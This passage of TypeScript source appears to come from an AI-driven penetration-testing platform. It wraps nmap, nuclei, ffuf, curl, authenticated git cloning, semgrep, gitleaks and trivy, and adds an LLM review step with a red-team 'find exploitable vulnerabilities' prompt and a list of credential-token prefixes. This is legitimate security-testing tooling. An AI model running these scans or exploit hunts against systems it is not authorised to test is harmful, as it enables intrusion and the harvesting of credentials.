  if (url.startsWith('https://')) variants.push(url.replace('https://', 'http://'));
  else if (url.startsWith('http://')) variants.push(url.replace('http://', 'https://'));
  // Also try without protocol prefix in case the LLM stripped it
  const bare = url.replace(/^https?:\/\//, '');
  if (!variants.includes(bare)) variants.push(bare);
  if (!variants.includes(`https://${bare}`)) variants.push(`https://${bare}`);
  if (!variants.includes(`http://${bare}`)) variants.push(`http://${bare}`);
  for (const v of variants) {
    const slug = Buffer.from(v).toString('base64url').slice(0, 40).replace(/[^a-z0-9]/gi, '_');
    const p = `/tmp/t3mp3st-repo-${slug}`;
    if (existsSync(p)) return p;
  }
  return null;
}

/**
 * Async variant of resolveClonePath for local:// targets.
 * If the extracted directory doesn't exist but the ZIP does, auto-extracts it so
 * WEAPONIZE tools are self-healing even if RECON was skipped or ran the wrong tool.
 * For non-local URLs delegates synchronously to resolveClonePath.
 */
async function resolveOrPreparePath(url: string): Promise<string | null> {
  if (!url.startsWith('local://')) return resolveClonePath(url);
  const name = url.slice(8);
  if (!name || name.includes('/') || name.includes('..') || name.includes('\0')) return null;
  const dirPath = `/data/uploads/${name}`;
  if (existsSync(dirPath)) return dirPath;
  const zipPath = `/data/uploads/${name}.zip`;
  if (!existsSync(zipPath)) return null;
  try {
    const mk = await runSubprocess('mkdir', ['-p', dirPath], { timeout: 5000 });
    if (mk.exitCode !== 0) return null;
    const uz = await runSubprocess('unzip', ['-q', '-o', zipPath, '-d', dirPath], { timeout: 120000 });
    return uz.exitCode === 0 && existsSync(dirPath) ? dirPath : null;
  } catch { return null; }
}

export const EXTERNAL_TOOLS: CustomTool[] = [
  {
    name: 'nmap_scan',
    description: 'Run nmap port/service scan (requires nmap installed)',
    category: 'recon',
    parameters: [
      { name: 'target', type: 'string', description: 'Target IP or hostname', required: true },
      { name: 'flags', type: 'string', description: 'nmap flags (e.g., "-sV -sC -T4")', required: false, default: '-sV -T4' },
      { name: 'ports', type: 'string', description: 'Port specification (e.g., "1-1000" or "22,80,443")', required: false },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('nmap'))) {
        return { success: false, error: 'nmap is not installed. Install it with: apt install nmap' };
      }
      const target = context.parameters.target as string;
      const flags = (context.parameters.flags as string || '-sV -T4').split(/\s+/);
      const ports = context.parameters.ports as string | undefined;

      const args = [...flags];
      if (ports) args.push('-p', ports);
      args.push(target);

      const result = await runSubprocess('nmap', args, { timeout: 120000 });
      if (result.exitCode !== 0) {
        return { success: false, error: `nmap failed: ${result.stderr}` };
      }

      // Parse open ports from output
      const openPorts = (result.stdout.match(/(\d+)\/tcp\s+open/g) || []).length;
      return {
        success: true,
        output: result.stdout,
        findings: openPorts > 0 ? [{
          title: 'Open Ports/Services Detected (nmap)',
          severity: 'info',
          details: `nmap found ${openPorts} open ports on ${target}`,
        }] : undefined,
      };
    },
  },
  {
    name: 'nuclei_scan',
    description: 'Run nuclei vulnerability scanner (requires nuclei installed)',
    category: 'vuln',
    parameters: [
      { name: 'target', type: 'string', description: 'Target URL', required: true },
      { name: 'severity', type: 'string', description: 'Severity filter: info,low,medium,high,critical', required: false, default: 'medium,high,critical' },
      { name: 'tags', type: 'string', description: 'Template tags (e.g., "cve,sqli,xss")', required: false },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('nuclei'))) {
        return { success: false, error: 'nuclei is not installed. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest' };
      }
      const target = context.parameters.target as string;
      const severity = context.parameters.severity as string || 'medium,high,critical';
      const tags = context.parameters.tags as string | undefined;

      const args = ['-target', target, '-severity', severity, '-silent', '-jsonl'];
      if (tags) args.push('-tags', tags);

      const result = await runSubprocess('nuclei', args, { timeout: 300000 });

      // Parse JSON lines output
      const findings: Array<{ title: string; severity: 'info' | 'low' | 'medium' | 'high' | 'critical'; details: string }> = [];
      for (const line of result.stdout.split('\n').filter(l => l.trim())) {
        try {
          const entry = JSON.parse(line);
          findings.push({
            title: entry.info?.name || entry['template-id'] || 'Unknown',
            severity: entry.info?.severity || 'info',
            details: `${entry.info?.name || 'Finding'} at ${entry.host || target}: ${entry.info?.description || entry.matched || ''}`,
          });
        } catch {
          // Skip non-JSON lines
        }
      }

      return {
        success: true,
        output: findings.length > 0
          ? `Nuclei scan of ${target}:\nFound ${findings.length} vulnerabilities:\n${findings.map(f => `  [${f.severity.toUpperCase()}] ${f.title}`).join('\n')}`
          : `Nuclei scan of ${target}: No vulnerabilities found at severity level: ${severity}`,
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'ffuf_fuzz',
    description: 'Run ffuf web fuzzer for directory/parameter discovery (requires ffuf installed)',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL with FUZZ keyword (e.g., http://target/FUZZ)', required: true },
      { name: 'wordlist', type: 'string', description: 'Path to wordlist', required: false, default: '/usr/share/wordlists/dirb/common.txt' },
      { name: 'mc', type: 'string', description: 'Match HTTP status codes', required: false, default: '200,301,302,403' },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('ffuf'))) {
        return { success: false, error: 'ffuf is not installed. Install: go install github.com/ffuf/ffuf/v2@latest' };
      }
      const url = context.parameters.url as string;
      const wordlist = context.parameters.wordlist as string || '/usr/share/wordlists/dirb/common.txt';
      const mc = context.parameters.mc as string || '200,301,302,403';

      const args = ['-u', url, '-w', wordlist, '-mc', mc, '-o', '/dev/stdout', '-of', 'json', '-s'];
      const result = await runSubprocess('ffuf', args, { timeout: 120000 });

      try {
        const data = JSON.parse(result.stdout);
        const results = data.results || [];
        return {
          success: true,
          output: `ffuf scan of ${url}:\nFound ${results.length} results:\n${results.slice(0, 50).map((r: { input?: { FUZZ?: string }; status?: number; length?: number }) =>
            `  ${r.input?.FUZZ || '?'} -> ${r.status} (${r.length} bytes)`
          ).join('\n')}`,
          findings: results.length > 0 ? [{
            title: 'Directories/Files Discovered (ffuf)',
            severity: 'info',
            details: `Found ${results.length} accessible paths`,
          }] : undefined,
        };
      } catch {
        return { success: true, output: result.stdout || 'No results found' };
      }
    },
  },
  {
    name: 'curl_request',
    description: 'Make an HTTP request using curl (supports advanced options)',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to request', required: true },
      { name: 'method', type: 'string', description: 'HTTP method', required: false, default: 'GET' },
      { name: 'data', type: 'string', description: 'Request body data', required: false },
      { name: 'headers', type: 'string', description: 'Headers as "Key: Value" (comma separated)', required: false },
      { name: 'flags', type: 'string', description: 'Additional curl flags', required: false },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('curl'))) {
        return { success: false, error: 'curl is not installed' };
      }
      const url = context.parameters.url as string;
      const method = context.parameters.method as string || 'GET';
      const data = context.parameters.data as string | undefined;
      const headers = context.parameters.headers as string | undefined;
      const flags = context.parameters.flags as string | undefined;

      const args = ['-s', '-i', '-X', method];
      if (data) args.push('-d', data);
      if (headers) {
        for (const h of headers.split(',')) {
          args.push('-H', h.trim());
        }
      }
      if (flags) args.push(...flags.split(/\s+/));
      args.push(url);

      const result = await runSubprocess('curl', args, { timeout: 30000 });
      return {
        success: result.exitCode === 0,
        output: result.stdout,
        error: result.exitCode !== 0 ? result.stderr : undefined,
      };
    },
  },

  // =============================================================================
  // CODE / SUPPLY CHAIN SCAN TOOLS
  // Require: git, semgrep (pip), gitleaks, trivy — all installed in the container.
  // All tools derive the clone path from the repo URL so they share one checkout.
  // =============================================================================

  {
    name: 'git_clone_analyze',
    description: 'Clone a git repository and enumerate its structure, languages, and CI/CD files. Supports authenticated repos via token, username/token, or SSH key.',
    category: 'code',
    parameters: [
      { name: 'url', type: 'string', description: 'Repository URL (https://github.com/org/repo or git@github.com:org/repo.git)', required: true },
      { name: 'depth', type: 'number', description: 'Clone depth for history (default 50, use 0 for full)', required: false, default: 50 },
      { name: 'token', type: 'string', description: 'Auth token/PAT for private repos — GitHub PAT, GitLab token, Azure DevOps PAT, Gitea token, Bitbucket app password', required: false },
      { name: 'username', type: 'string', description: 'Username for token auth. Defaults: GitHub → token-only, GitLab → oauth2, Bitbucket → your Bitbucket username, Azure DevOps → any string. Only needed when the host requires user:token format.', required: false },
      { name: 'ssh_key', type: 'string', description: 'SSH private key content (PEM/OpenSSH format) for git@ SSH URLs. Paste the full key including header/footer lines.', required: false },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('git'))) {
        return { success: false, error: 'git is not installed' };
      }
      const url = String(context.parameters.url || '');
      if (!url) return { success: false, error: 'url parameter required' };

      // Reject local:// targets early — those belong to local_code_scan, not git clone
      if (url.startsWith('local://')) {
        return { success: false, error: `git_clone_analyze does not handle local:// targets. Use local_code_scan with path="${url}" instead.` };
      }

      const token = String(context.parameters.token || '').trim();
      const username = String(context.parameters.username || '').trim();
      const sshKey = String(context.parameters.ssh_key || '').trim();

      // Build the authenticated clone URL (HTTPS) or SSH env.
      // Slug always uses the clean URL so downstream tools (semgrep_scan, gitleaks_scan, etc.)
      // can still resolve the clone path without knowing the credentials.
      let cloneUrl = url;
      let sshKeyPath: string | null = null;
      const extraEnv: Record<string, string> = {};

      if (token && !url.startsWith('git@') && !url.startsWith('ssh://')) {
        // Inject credentials into the HTTPS URL.
        // Detect host to pick the right username convention:
        //   GitHub/Gitea  → https://<token>@host/path  (no username needed)
        //   GitLab        → https://oauth2:<token>@host/path
        //   Azure DevOps  → https://<anything>:<token>@host/path
        //   Bitbucket     → https://<username>:<token>@host/path
        const host = (() => { try { return new URL(url).hostname.toLowerCase(); } catch { return ''; } })();
        let user = username;
        if (!user) {
          if (host.includes('gitlab')) user = 'oauth2';
          else if (host.includes('dev.azure.com') || host.includes('visualstudio.com')) user = 'pat';
          else if (host.includes('bitbucket')) user = 'x-token-auth';
          // GitHub, Gitea, self-hosted forgejo: token-only (no username)
        }
        const encodedToken = encodeURIComponent(token);
        const encodedUser = user ? encodeURIComponent(user) : '';
        try {
          const parsed = new URL(url);
          parsed.username = encodedUser;
          parsed.password = encodedToken;
          cloneUrl = parsed.toString();
        } catch {
          // Fallback: manual injection
          const proto = url.startsWith('https://') ? 'https://' : 'http://';
          const rest = url.slice(proto.length);
          cloneUrl = encodedUser
            ? `${proto}${encodedUser}:${encodedToken}@${rest}`
            : `${proto}${encodedToken}@${rest}`;
        }
      } else if (sshKey) {
        // Write SSH key to a temp file and use GIT_SSH_COMMAND to point at it
        const { writeFileSync, mkdirSync } = await import('fs');
        const keyDir = `/tmp/t3mp3st-sshkey-${Date.now()}`;
        mkdirSync(keyDir, { mode: 0o700 });
        sshKeyPath = `${keyDir}/id`;
        writeFileSync(sshKeyPath, sshKey.endsWith('\n') ? sshKey : `${sshKey}\n`, { mode: 0o600 });
        extraEnv['GIT_SSH_COMMAND'] = `ssh -i ${sshKeyPath} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`;
      }

      // Strip credentials from messages shown back to the LLM
      const sanitize = (s: string) => token ? s.replace(new RegExp(token.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), '***') : s;

      const slug = Buffer.from(url).toString('base64url').slice(0, 40).replace(/[^a-z0-9]/gi, '_');
      const clonePath = `/tmp/t3mp3st-repo-${slug}`;
      const depth = Number(context.parameters.depth ?? 50);

      // Clone only if not already present
      try {
        if (!existsSync(clonePath)) {
          const cloneArgs = depth > 0
            ? ['clone', '--depth', String(depth), cloneUrl, clonePath]
            : ['clone', cloneUrl, clonePath];
          const cloneResult = await runSubprocess('git', cloneArgs, { timeout: 120000, env: { ...process.env, ...extraEnv } });
          if (cloneResult.exitCode !== 0) {
            return { success: false, error: sanitize(`git clone failed: ${cloneResult.stderr.slice(0, 500)}`) };
          }
        }
      } catch (err) {
        return { success: false, error: sanitize(`Clone failed: ${err instanceof Error ? err.message : String(err)}`) };
      } finally {
        // Always remove SSH key from disk after clone attempt
        if (sshKeyPath) {
          try { const { rmSync } = await import('fs'); rmSync(sshKeyPath, { force: true }); rmSync(sshKeyPath.replace('/id', ''), { recursive: true, force: true }); } catch { /* ignore */ }
        }
      }

      // List source files
      const fileResult = await runSubprocess('find', [
        clonePath, '-type', 'f',
        '(', '-name', '*.ts', '-o', '-name', '*.js', '-o', '-name', '*.py',
              '-o', '-name', '*.php', '-o', '-name', '*.go', '-o', '-name', '*.rs',
              '-o', '-name', '*.java', '-o', '-name', '*.rb', '-o', '-name', '*.cs',
              '-o', '-name', '*.c', '-o', '-name', '*.cpp', '-o', '-name', '*.sol', ')',
        '-not', '-path', '*/node_modules/*', '-not', '-path', '*/.git/*',
      ], { timeout: 30000, maxOutput: 50000 });

      const sourceFiles = fileResult.stdout.split('\n').filter(Boolean);
      const langCounts: Record<string, number> = {};
      for (const f of sourceFiles) {
        const ext = f.split('.').pop()?.toLowerCase() || '';
        langCounts[ext] = (langCounts[ext] || 0) + 1;
      }

      // Check for notable config files
      const configFiles: string[] = [];
      for (const cfg of ['package.json', 'requirements.txt', 'go.mod', 'Gemfile', 'pom.xml', 'build.gradle',
                          'docker-compose.yml', 'Dockerfile', '.env.example', '.github/workflows']) {
        
        
        if (existsSync(pathJoin(clonePath, cfg))) configFiles.push(cfg);
      }

      const langSummary = Object.entries(langCounts)
        .sort((a, b) => b[1] - a[1])
        .map(([ext, n]) => `${ext}(${n})`)
        .join(', ');

      const output = [
        `Repository cloned: ${url}`,
        `Clone path: ${clonePath}`,
        `Source files: ${sourceFiles.length} (${langSummary || 'none'})`,
        configFiles.length ? `Config files found: ${configFiles.join(', ')}` : 'No notable config files',
      ].join('\n');

      return {
        success: true,
        output,
        findings: [{
          title: 'Repository Structure Analyzed',
          severity: 'info',
          details: output,
          provenance: 'tool',
          toolName: 'git_clone_analyze',
          toolOutput: output,
        }],
      };
    },
  },

  {
    name: 'semgrep_scan',
    description: 'Run semgrep static analysis on a cloned repository (requires semgrep)',
    category: 'code',
    parameters: [
      { name: 'url', type: 'string', description: 'Repository URL (to find the clone path)', required: true },
      { name: 'config', type: 'string', description: 'Semgrep config (default: auto)', required: false, default: 'auto' },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('semgrep'))) {
        return { success: false, error: 'semgrep is not installed. Install with: pip install semgrep' };
      }
      const url = String(context.parameters.url || '');
      const config = String(context.parameters.config ?? 'auto');
      const clonePath = await resolveOrPreparePath(url);

      if (!clonePath) {
        const hint = url.startsWith('local://')
          ? `Run local_code_scan with path="${url}" first to extract the target`
          : `Run git_clone_analyze with url="${url}" first`;
        return { success: false, error: `Scan target not ready. ${hint}` };
      }

      const result = await runSubprocess('semgrep', [
        '--config', config, '--json', '--no-git-ignore', '--quiet', clonePath,
      ], { timeout: 360000, maxOutput: 4 * 1024 * 1024 });

      if (result.exitCode === -1) {
        return { success: false, error: `semgrep scan timed out after 360s for ${url}. The repository may be too large for a single scan pass.` };
      }

      let parsed: { results?: Array<{ check_id: string; path: string; start: { line: number }; end: { line: number }; extra: { message: string; severity: string; lines?: string } }> } = { results: [] };
      try {
        parsed = JSON.parse(result.stdout || '{}');
      } catch {
        return { success: false, error: `semgrep output parse failed: ${result.stderr.slice(0, 300)}` };
      }

      const results = parsed.results || [];
      const sevMap: Record<string, 'critical' | 'high' | 'medium' | 'low' | 'info'> = {
        ERROR: 'high', WARNING: 'medium', INFO: 'low',
      };

      // extra.lines from semgrep returns "requires login" without a Pro account.
      // Read the actual matched code directly from the cloned file instead.
      const readMatchedLines = (filePath: string, startLine: number, endLine: number): string => {
        try {
          const lines = readFileSync(filePath, 'utf8').split('\n');
          const from = Math.max(0, startLine - 1);
          const to = Math.min(lines.length, endLine);
          return lines.slice(from, to).join('\n').trim().slice(0, 400);
        } catch {
          return '';
        }
      };

      const semgrepCmd = `semgrep --config ${config} --json --no-git-ignore --quiet ${clonePath}`;
      const findings = results.slice(0, 50).map(r => {
        const relPath = r.path.replace(clonePath, '');
        const matchedLines = readMatchedLines(r.path, r.start?.line ?? 1, r.end?.line ?? r.start?.line ?? 1);
        const metadata = (r.extra as { metadata?: Record<string, unknown> }).metadata || {};
        const refs = Array.isArray(metadata.references) ? (metadata.references as string[]).slice(0, 3).join(', ') : '';
        const cwe = metadata.cwe ? `CWE: ${metadata.cwe}` : '';
        return {
          title: `Semgrep: ${r.check_id.split('.').pop() || r.check_id}`,
          severity: sevMap[r.extra?.severity?.toUpperCase()] ?? 'medium' as const,
          details: [
            `Rule: ${r.check_id}`,
            `File: ${relPath}:${r.start?.line}`,
            r.extra?.message || '',
            cwe,
            refs ? `References: ${refs}` : '',
          ].filter(Boolean).join('\n'),
          provenance: 'tool' as const,
          toolName: 'semgrep_scan',
          toolOutput: `${r.check_id} at ${relPath}:${r.start?.line} — ${r.extra?.message?.slice(0, 120) || ''}`,
          scanCommand: semgrepCmd,
          scanOutput: [
            `Rule: ${r.check_id}`,
            `Severity: ${r.extra?.severity}`,
            `File: ${relPath}:${r.start?.line}`,
            `Message: ${r.extra?.message || ''}`,
            matchedLines ? `\nMatched code:\n${matchedLines}` : '',
            cwe,
            refs ? `References: ${refs}` : '',
          ].filter(Boolean).join('\n'),
        };
      });

      return {
        success: true,
        output: `Semgrep found ${results.length} issues in ${url}\n` +
          (results.length > 50 ? `(showing first 50)\n` : '') +
          findings.slice(0, 5).map(f => `  [${f.severity.toUpperCase()}] ${f.title}`).join('\n'),
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },

  {
    name: 'gitleaks_scan',
    description: 'Scan a repository for leaked secrets and credentials including git history (requires gitleaks)',
    category: 'code',
    parameters: [
      { name: 'url', type: 'string', description: 'Repository URL (to find the clone path)', required: true },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('gitleaks'))) {
        return { success: false, error: 'gitleaks is not installed' };
      }
      const url = String(context.parameters.url || '');
      const clonePath = await resolveOrPreparePath(url);

      if (!clonePath) {
        const hint = url.startsWith('local://')
          ? `Run local_code_scan with path="${url}" first to extract the target`
          : `Run git_clone_analyze with url="${url}" first`;
        return { success: false, error: `Scan target not ready. ${hint}` };
      }

      type GitleaksLeak = { Description: string; Secret: string; File: string; StartLine?: number; Line?: number; Commit: string; RuleID: string };

      const runGitleaks = async (extraArgs: string[]): Promise<GitleaksLeak[]> => {
        // Use a temp file — /dev/stdout is unreliable when gitleaks opens it via fopen()
        // rather than writing to fd 1, causing execFileAsync's pipe to miss the output.
        const tmpReport = `/tmp/gitleaks-${randomUUID()}.json`;
        try {
          const res = await runSubprocess('gitleaks', [
            'detect', '--source', clonePath, '--report-format', 'json',
            '--report-path', tmpReport, '--no-banner', '--exit-code', '0',
            ...extraArgs,
          ], { timeout: 180000, maxOutput: 512 * 1024 });
          if (res.exitCode === -1) return [];
          try {
            const raw = readFileSync(tmpReport, 'utf8');
            return JSON.parse(raw) as GitleaksLeak[];
          } catch { return []; }
        } finally {
          try { unlinkSync(tmpReport); } catch { /* ok */ }
        }
      };

      // Run two complementary scans:
      // 1. Git-history scan — finds secrets committed in recent git history (limited by clone depth)
      // 2. Working-tree scan (--no-git) — finds secrets in current files regardless of commit depth
      const [gitLeaks, wtLeaks] = await Promise.all([runGitleaks([]), runGitleaks(['--no-git'])]);

      // Merge, deduplicate by RuleID+File+line
      const seen = new Set<string>();
      const allLeaks: GitleaksLeak[] = [];
      for (const leak of [...gitLeaks, ...wtLeaks]) {
        const key = `${leak.RuleID}|${leak.File}|${leak.StartLine ?? leak.Line ?? 0}`;
        if (!seen.has(key)) { seen.add(key); allLeaks.push(leak); }
      }

      if (allLeaks.length === 0 && gitLeaks.length === 0 && wtLeaks.length === 0) {
        // Both scans returned nothing — check if either timed out (no data at all)
        return { success: false, error: `gitleaks scan timed out or failed for ${url}.` };
      }

      const leaks = allLeaks;

      const HIGH_ENTROPY_PATTERNS = ['AKIA', 'sk-ant-', 'sk-', 'ghp_', 'ghs_', 'github_pat_', 'xox', 'rk_live', 'AC'];

      const gitleaksCmd = `gitleaks detect --source ${clonePath} --report-format json --no-banner --exit-code 0`;
      const findings = leaks.slice(0, 30).map(leak => {
        const secretLen = (leak.Secret || '').length;
        const redacted = `[REDACTED len=${secretLen}]`;
        const isHighValue = HIGH_ENTROPY_PATTERNS.some(p => (leak.Secret || '').startsWith(p));
        const relFile = (leak.File || '').replace(clonePath, '');
        const commitShort = (leak.Commit || '').slice(0, 8);
        // gitleaks 8.x uses StartLine; older versions used Line
        const lineNum = leak.StartLine ?? leak.Line;
        return {
          title: `Secret Detected: ${leak.Description || leak.RuleID}`,
          severity: isHighValue ? 'critical' as const : 'high' as const,
          details: [
            `Rule: ${leak.RuleID}`,
            `File: ${relFile} line ${lineNum}`,
            `Commit: ${commitShort || '(working tree)'}`,
            `Secret: ${redacted}`,
            leak.Description ? `Description: ${leak.Description}` : '',
          ].filter(Boolean).join('\n'),
          provenance: 'tool' as const,
          toolName: 'gitleaks_scan',
          toolOutput: `${leak.RuleID} in ${relFile}:${lineNum} commit=${commitShort || 'HEAD'} (${redacted})`,
          scanCommand: gitleaksCmd,
          scanOutput: JSON.stringify({
            RuleID: leak.RuleID,
            Description: leak.Description,
            File: relFile,
            Line: lineNum,
            Commit: commitShort || '(working tree)',
            Secret: redacted,
          }, null, 2),
        };
      });

      return {
        success: true,
        output: leaks.length > 0
          ? `gitleaks found ${leaks.length} secret leak(s) in ${url}` + (leaks.length > 30 ? ' (showing first 30)' : '')
          : `gitleaks: no secrets found in ${url}`,
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },

  {
    name: 'trivy_scan',
    description: 'Scan a repository for dependency vulnerabilities and misconfigurations (requires trivy)',
    category: 'code',
    parameters: [
      { name: 'url', type: 'string', description: 'Repository URL (to find the clone path)', required: true },
    ],
    handler: async (context) => {
      if (!(await isToolAvailable('trivy'))) {
        return { success: false, error: 'trivy is not installed' };
      }
      const url = String(context.parameters.url || '');
      const clonePath = await resolveOrPreparePath(url);

      if (!clonePath) {
        const hint = url.startsWith('local://')
          ? `Run local_code_scan with path="${url}" first to extract the target`
          : `Run git_clone_analyze with url="${url}" first`;
        return { success: false, error: `Scan target not ready. ${hint}` };
      }

      const result = await runSubprocess('trivy', [
        'fs', '--format', 'json', '--scanners', 'vuln,secret', '--quiet', clonePath,
      ], { timeout: 300000, maxOutput: 4 * 1024 * 1024 });

      if (result.exitCode === -1) {
        return { success: false, error: `trivy scan timed out after 300s for ${url}.` };
      }

      let report: { Results?: Array<{ Target: string; Vulnerabilities?: Array<{ VulnerabilityID: string; PkgName: string; Severity: string; Title: string; Description: string }>; Secrets?: Array<{ RuleID: string; Category?: string; Severity: string; Title: string; StartLine?: number; EndLine?: number }> }> } = {};
      try {
        report = JSON.parse(result.stdout || '{}');
      } catch {
        return { success: false, error: `trivy output parse failed: ${result.stderr.slice(0, 300)}` };
      }

      const sevMap: Record<string, 'critical' | 'high' | 'medium' | 'low' | 'info'> = {
        CRITICAL: 'critical', HIGH: 'high', MEDIUM: 'medium', LOW: 'low', UNKNOWN: 'info',
      };

      type TrivyVuln = {
        VulnerabilityID: string; PkgName: string; Severity: string;
        Title: string; Description: string;
        InstalledVersion?: string; FixedVersion?: string;
        PrimaryURL?: string; References?: string[];
        CVSS?: Record<string, { V3Score?: number; V2Score?: number }>;
      };
      type TrivySecret = {
        RuleID: string; Category?: string; Severity: string;
        Title: string; StartLine?: number; EndLine?: number;
      };
      const allVulns: Array<{ target: string; vuln: TrivyVuln }> = [];
      const allSecrets: Array<{ target: string; secret: TrivySecret }> = [];
      for (const r of report.Results || []) {
        for (const v of (r.Vulnerabilities || []) as TrivyVuln[]) {
          allVulns.push({ target: r.Target, vuln: v });
        }
        for (const s of (r.Secrets || []) as TrivySecret[]) {
          allSecrets.push({ target: r.Target, secret: s });
        }
      }

      const trivyCmd = `trivy fs --format json --scanners vuln,secret --quiet ${clonePath}`;
      const vulnFindings = allVulns.slice(0, 25).map(({ target, vuln }) => {
        const cvssScore = vuln.CVSS
          ? Object.values(vuln.CVSS).map(s => s.V3Score ?? s.V2Score).filter(s => s != null)[0]
          : undefined;
        return {
          title: `${vuln.VulnerabilityID}: ${vuln.PkgName}`,
          severity: sevMap[vuln.Severity?.toUpperCase()] ?? 'medium' as const,
          details: [
            `${vuln.VulnerabilityID} in ${vuln.PkgName} (${target})`,
            `Severity: ${vuln.Severity}${cvssScore != null ? ` (CVSS ${cvssScore})` : ''}`,
            vuln.InstalledVersion ? `Installed: ${vuln.InstalledVersion}` : '',
            vuln.FixedVersion ? `Fixed in: ${vuln.FixedVersion}` : 'No fix available',
            '',
            vuln.Title || '',
            vuln.Description?.slice(0, 400) || '',
            vuln.PrimaryURL ? `\nAdvisory: ${vuln.PrimaryURL}` : '',
          ].filter(s => s !== undefined).join('\n').trim(),
          cve: vuln.VulnerabilityID?.startsWith('CVE-') ? [vuln.VulnerabilityID] : undefined,
          provenance: 'tool' as const,
          toolName: 'trivy_scan',
          toolOutput: [
            `${vuln.VulnerabilityID} [${vuln.Severity}] ${vuln.PkgName}`,
            vuln.InstalledVersion ? `installed=${vuln.InstalledVersion}` : '',
            vuln.FixedVersion ? `fix=${vuln.FixedVersion}` : 'no-fix',
            vuln.Title?.slice(0, 80) || '',
          ].filter(Boolean).join(' | '),
          scanCommand: trivyCmd,
          scanOutput: JSON.stringify({
            VulnerabilityID: vuln.VulnerabilityID,
            PkgName: vuln.PkgName,
            Severity: vuln.Severity,
            InstalledVersion: vuln.InstalledVersion,
            FixedVersion: vuln.FixedVersion,
            Title: vuln.Title,
            Description: vuln.Description?.slice(0, 500),
            PrimaryURL: vuln.PrimaryURL,
            References: (vuln.References || []).slice(0, 5),
          }, null, 2),
        };
      });

      const secretFindings = allSecrets.slice(0, 15).map(({ target, secret }) => ({
        title: `Trivy Secret: ${secret.Title || secret.RuleID}`,
        severity: sevMap[secret.Severity?.toUpperCase()] ?? 'high' as const,
        details: [
          `Rule: ${secret.RuleID}${secret.Category ? ` (${secret.Category})` : ''}`,
          `File: ${target}${secret.StartLine != null ? ` line ${secret.StartLine}` : ''}`,
          secret.Title || '',
        ].filter(Boolean).join('\n'),
        provenance: 'tool' as const,
        toolName: 'trivy_scan',
        toolOutput: `${secret.RuleID} in ${target}${secret.StartLine != null ? `:${secret.StartLine}` : ''}`,
        scanCommand: trivyCmd,
        scanOutput: JSON.stringify({ RuleID: secret.RuleID, Category: secret.Category, Severity: secret.Severity, Title: secret.Title, File: target, StartLine: secret.StartLine }, null, 2),
      }));

      const findings = [...vulnFindings, ...secretFindings];
      const totalFound = allVulns.length + allSecrets.length;

      return {
        success: true,
        output: totalFound > 0
          ? `trivy found ${allVulns.length} vulnerabilities and ${allSecrets.length} secrets in ${url}` +
            (totalFound > 40 ? ` (showing first ${findings.length})` : '')
          : `trivy: no vulnerabilities or secrets found in ${url}`,
        findings: findings.length > 0 ? findings : undefined,
      };
    },
  },
  {
    name: 'llm_code_review',
    description: 'LLM-based semantic code security review — finds logic flaws, data-flow vulns, and context-dependent issues that pattern matching misses',
    category: 'code',
    parameters: [
      { name: 'url', type: 'string', description: 'Repository URL (to locate the locally-cloned copy)', required: true },
      { name: 'focus', type: 'string', description: 'Focus area: auth | injection | logic | secrets | all', required: false, default: 'all' },
    ],
    handler: async (context) => {
      const llm = context.llm as LLMBackbone | undefined;
      if (!llm) return { success: false, error: 'llm_code_review requires an LLM backbone — set API key in Settings' };

      const url = String(context.parameters.url ?? '').trim();
      const focus = String(context.parameters.focus ?? 'all').trim();
      const clonePath = await resolveOrPreparePath(url);

      if (!clonePath) {
        const hint = url.startsWith('local://')
          ? `Run local_code_scan with path="${url}" first to extract the target`
          : `Run git_clone_analyze with url="${url}" first`;
        return { success: false, error: `Scan target not ready. ${hint}` };
      }

      const allFiles = walkSourceFiles(clonePath);
      const selected = scoreForReview(allFiles, focus);

      const CHAR_BUDGET = 100000;
      let totalChars = 0;
      const chunks: string[] = [];
      for (const { path: fp, relPath } of selected) {
        if (totalChars >= CHAR_BUDGET) break;
        try {
          const raw = readFileSync(fp, 'utf8').slice(0, 6000);
          const chunk = raw.slice(0, CHAR_BUDGET - totalChars);
          chunks.push(`=== ${relPath} ===\n${chunk}`);
          totalChars += chunk.length;
        } catch { /* unreadable */ }
      }

      if (chunks.length === 0) {
        return { success: false, error: `No readable source files in cloned repo at ${clonePath}` };
      }

      const focusDesc: Record<string, string> = {
        auth:      'authentication/authorization flaws: missing checks, broken session management, privilege escalation, JWT weaknesses',
        injection: 'injection sinks: SQL injection, command injection, SSTI, XSS, XXE, path traversal, SSRF',
        logic:     'business logic: race conditions, TOCTOU, missing validation, insecure state transitions',
        secrets:   'hardcoded credentials, API keys, tokens, private keys embedded in code',
        all:       'auth flaws, injection vulnerabilities, business logic bugs, insecure crypto, hardcoded secrets, SSRF',
      };

      const systemPrompt = `You are a red team code auditor with an offensive security background. You find exploitable vulnerabilities in source code — not theoretical issues or style concerns.

## Analysis Methodology
Work through the code as an attacker would:
1. **Map the attack surface** — identify every entry point where untrusted data enters: HTTP request params/body/headers/cookies, URL path segments, uploaded files, environment variables, database rows loaded from user-controlled storage, IPC, WebSocket messages, CLI arguments.
2. **Trace tainted data** — follow attacker-controlled input through the call stack. Note every sanitization, encoding, and validation step. Ask: is it applied BEFORE the dangerous operation? Can it be bypassed (type confusion, encoding tricks, null bytes, Unicode normalization)?
3. **Identify dangerous sinks** — SQL query construction, shell command execution, template rendering engines, file path operations, deserialization calls, eval/exec/Function(), SSRF-prone HTTP fetches, redirect targets, HTML output without encoding.
4. **Check auth and access control** — for every sensitive operation (data writes, admin actions, privileged resources): is authentication enforced? Is authorization checked per-object (not just per-route)? Can an authenticated user access another user's data by changing an ID?
5. **Look for logic flaws** — race conditions, TOCTOU, missing ownership checks, insecure state machines, mass assignment, parameter pollution, integer overflow, path traversal in file operations.
